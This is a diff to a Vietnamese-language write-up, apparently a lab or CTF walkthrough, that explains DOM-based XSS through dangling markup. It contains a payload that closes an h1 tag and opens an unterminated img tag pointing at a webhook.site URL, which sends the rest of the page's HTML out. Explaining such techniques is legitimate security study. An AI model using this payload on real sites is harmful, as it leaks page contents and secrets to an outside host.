@@ -41,7 +41,8 @@
   - Quay lại vấn đề cũ, để thực thi được DOM-Based XSS và gửi request ra ngoài, ta áp dụng **Dangling markup** sử dụng một thẻ html nào đó có thể gửi request tới đường dẫn chỉ định. 
 
     Ta thử với thẻ ```img``` và thấy rằng nó gửi một request tới webhook của mình kèm theo tham số là chuỗi html đằng sau 
-    ```Payload: </h1> <img src='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?
+    ```diff
+    Payload: </h1> <img src='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?
     ```
     Giải thích payload:
     - Phần </h1> là để bypass thẻ <h1> sẵn có của DOM mà ta inject
